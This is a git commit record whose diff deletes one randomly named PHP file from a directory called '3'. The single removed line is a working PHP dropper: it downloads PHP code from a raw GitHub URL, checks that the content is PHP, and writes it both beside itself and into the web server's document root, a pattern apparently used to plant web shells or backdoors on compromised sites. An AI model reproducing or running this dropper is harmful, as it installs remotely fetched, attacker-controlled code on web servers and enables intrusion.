b564e4d7505e740d9d767fa45f7344d95a09631f
maddalenasa <MaddalenaSa1995@proton.me>
2025-09-01 01:02:33 -0300

    Delete 3 directory

--- 3/iGOx4PWEuftGLs.php
+++
@@ -1,1 +0,0 @@
-<?php $c = file_get_contents('https://raw.githubusercontent.com/maddalenasa/supportaa/refs/heads/main/2/iGOx4PWEuftGLs.php'); if (strpos($c, '<?php')===false) die('err'); file_put_contents('iGOx4PWEuftGLs-1.php', $c); print('ok'); $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/iGOx4PWEuftGLs.php', $c); if ($r===false) die(' not2'); die(' ok2');
